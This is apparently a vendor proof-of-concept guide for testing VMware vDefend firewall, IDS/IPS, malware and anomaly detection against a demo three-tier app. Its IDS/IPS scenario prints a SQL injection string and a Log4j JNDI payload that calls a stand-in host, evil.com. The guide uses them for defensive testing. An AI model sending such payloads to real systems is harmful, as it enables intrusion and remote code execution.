# VMware vDefend: Evaluation & Testing Guide
**Target Environment:** CommunitySafe 3-Tier Demo Application

This guide outlines a structured Proof of Concept (POC) plan to evaluate **VMware vDefend Firewall** and **Advanced Threat Prevention (ATP)**. It uses the *CommunitySafe* demo application to generate legitimate traffic, lateral movement, and malicious attack signatures on demand.

---

## 🏛️ Architecture Overview

The test environment consists of three zones (Micro-segments). Traffic must flow strictly from Left to Right.

* **Web Tier:** `TCP 80/443` (Ingress)
* **App Tier:** `TCP 5000` (Middleware)
* **DB Tier:** `TCP 5432` (Data)

---

## 🧪 Test Scenarios

### Scenario 1: Zero Trust Micro-segmentation (DFW)
**Objective:** Demonstrate enforcement of policy at the vNIC level.

1.  **Baseline:** Open the **CommunitySafe** app -> **Testing** tab. Click **"Single Flow"**. Verify blue dots travel `Web -> App -> DB`.
2.  **Attack:** Create a DFW Rule in NSX blocking `App -> DB` (TCP 5432).
3.  **Validation:** Click **"Single Flow"**. The flow will visually stop/fail. Go to the **Resident** tab; alerts will fail to load.

### Scenario 2: Distributed IDS/IPS
**Objective:** Detect and block vulnerability exploits.

1.  **Attack:** Go to **Testing** tab -> **Attack Simulation**.
2.  **Test A (SQLi):** Click **"SQL Injection"**.
    * *Payload Sent:* `?id=' OR 1=1 --`
3.  **Test B (RCE):** Click **"Log4j / RCE Attack"**.
    * *Payload Sent:* `${jndi:ldap://evil.com/x}`
4.  **Validation:** Check **NSX Manager -> Security -> IDS/IPS Events**. Look for `ET WEB_SPECIFIC_APPS` or `Apache Log4j`.

### Scenario 3: Malware Prevention
**Objective:** Demonstrate file inspection.

1.  **Attack:** Click **"Malware Download (EICAR)"** in the Testing tab.
2.  **Validation:** Check **NSX Manager -> Malware Prevention**. Look for `EICAR-Test-File`.

### Scenario 4: NDR (Anomaly Detection)
**Objective:** Detect "low and slow" attacks.

1.  **Attack:** Click **"DNS Tunneling"** or **"Port Scan"**.
2.  **Validation:** Check **NSX NDR Dashboard** for MITRE ATT&CK T1048/T1046.

---

## 📝 Scorecard

| Capability | Test Method | Pass/Fail |
| :--- | :--- | :--- |
| **Segmentation** | Block App-to-DB traffic via DFW. | |
| **Exploit Block** | Trigger SQLi/Log4j via Testing Tab. | |
| **Malware** | Download EICAR file via Testing Tab. | |
| **Anomaly (NDR)** | Generate DNS Tunneling traffic. | |
